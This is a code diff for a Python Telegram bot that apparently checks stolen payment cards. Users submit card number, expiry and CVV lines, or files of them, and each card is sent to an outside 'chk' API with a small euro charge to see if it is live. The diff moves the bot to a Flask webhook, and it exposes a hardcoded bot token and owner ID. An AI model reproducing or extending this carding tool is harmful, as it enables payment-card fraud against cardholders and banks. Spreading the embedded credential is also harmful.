@@ -1,19 +1,20 @@
 import logging
 import requests
 import telebot
+from flask import Flask, request
 from threading import Event
 import time
 import json
 
-# Telegram bot token
+# Configuration
 TOKEN = "6531798224:AAFMgokXvj8bLTXyxQw2IkE0hyQnJf7oFTk"
 OWNER_ID = 6742022802  # Owner's Telegram ID
+WEBHOOK_URL = "https://ccx.onrender.com/" + TOKEN
+API_URL = "https://daxxteam.com/chk/api.php"
 
 # Initialize the bot
 bot = telebot.TeleBot(TOKEN)
-
-# Define the API endpoint and static parameters
-url = "https://daxxteam.com/chk/api.php"
+app = Flask(__name__)
 
 # Event to control the stopping of the card check process
 stop_event = Event()
@@ -43,12 +44,26 @@ def save_user_credits():
     with open('user_credits.json', 'w') as file:
         json.dump(user_credits, file)
 
-# Start command handler
+# Set webhook
+bot.remove_webhook()
+bot.set_webhook(url=WEBHOOK_URL)
+
+@app.route('/' + TOKEN, methods=['POST'])
+def webhook():
+    json_str = request.get_data().decode('UTF-8')
+    update = telebot.types.Update.de_json(json_str)
+    bot.process_new_updates([update])
+    return 'ok'
+
+@app.route('/')
+def index():
+    return "Bot is running"
+
+# Command handlers
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     bot.send_message(message.chat.id, "Welcome! Use /register to register and get 10 credits. Use the /chk command followed by card details in the format `cc|mm|yyyy|cvv`, or send a TXT file with card details. Use /stop to stop the card check process.")
 
-# /cmds command handler
 @bot.message_handler(commands=['cmds'])
 def send_cmds(message):
     cmds_message = (
@@ -64,7 +79,6 @@ def send_cmds(message):
     )
     bot.reply_to(message, cmds_message)
 
-# /register command handler
 @bot.message_handler(commands=['register'])
 def register_user(message):
     user_id = message.from_user.id
@@ -76,7 +90,6 @@ def register_user(message):
     save_user_credits()
     bot.reply_to(message, "You have been registered and received 10 credits.")
 
-# /info command handler
 @bot.message_handler(commands=['info'])
 def user_info(message):
     user_id = message.from_user.id
@@ -99,7 +112,6 @@ def user_info(message):
     )
     bot.reply_to(message, info_message)
 
-# /add command handler to authorize a group or user
 @bot.message_handler(commands=['add'])
 def add_authorization(message):
     if message.from_user.id != OWNER_ID:
@@ -119,7 +131,6 @@ def add_authorization(message):
             bot.reply_to(message, f"Group {group_id} has been authorized for CC checks.")
         else:
             bot.reply_to(message, f"Group {group_id} is already authorized.")
-
     else:
         if len(args) != 3:
             bot.reply_to(message, "Usage: /add <user_id> <credits>")
@@ -130,7 +141,6 @@ def add_authorization(message):
         save_user_credits()
         bot.reply_to(message, f"User {user_id} has been authorized with {credits} credits.")
 
-# /remove command handler to unauthorize a group or user
 @bot.message_handler(commands=['remove'])
 def remove_authorization(message):
     if message.from_user.id != OWNER_ID:
@@ -150,7 +160,6 @@ def remove_authorization(message):
             bot.reply_to(message, f"Group {group_id} has been unauthorized.")
         else:
             bot.reply_to(message, f"Group {group_id} is not authorized.")
-
     elif args[1] == 'userid':
         user_id = int(args[2])
         if user_id in user_credits:
@@ -159,11 +168,9 @@ def remove_authorization(message):
             bot.reply_to(message, f"User {user_id} has been unauthorized.")
         else:
             bot.reply_to(message, f"User {user_id} is not authorized.")
-
     else:
         bot.reply_to(message, "Invalid type. Use 'group' or 'userid'.")
 
-# /chk command handler
 @bot.message_handler(commands=['chk'])
 def check_card(message):
     user_id = message.from_user.id
@@ -199,7 +206,7 @@ def check_card(message):
             'currency': 'eur'
         }
         try:
-            response = requests.get(url, params=params)
+            response = requests.get(API_URL, params=params)
             end_time = time.time()
         except requests.exceptions.RequestException as e:
             bot.reply_to(message, f"Error connecting to API: {e}")
@@ -217,7 +224,6 @@ def check_card(message):
 
         time.sleep(10)
 
-# Document handler
 @bot.message_handler(content_types=['document'])
 def handle_file(message):
     user_id = message.from_user.id
@@ -255,12 +261,12 @@ def handle_file(message):
             if lista:
                 params = {
                     'lista': lista,
-                    'mode': 'cvv',# use any gate  cnn cvv 
+                    'mode': 'cvv',
                     'amount': 0.5,
                     'currency': 'eur'
                 }
                 try:
-                    response = requests.get(url, params=params)
+                    response = requests.get(API_URL, params=params)
                     end_time = time.time()
                 except requests.exceptions.RequestException as e:
                     bot.reply_to(message, f"Error connecting to API: {e}")
@@ -278,7 +284,6 @@ def handle_file(message):
 
                 time.sleep(10)
 
-# /stop command handler
 @bot.message_handler(commands=['stop'])
 def stop_process(message):
     if message.from_user.id == OWNER_ID:
@@ -289,5 +294,4 @@ def stop_process(message):
 
 if __name__ == "__main__":
     logging.basicConfig(level=logging.INFO)
-    bot.polling(none_stop=True)
-    
+    app.run(host='0.0.0.0', port=5000)  # Ensure to use appropriate port for deployment
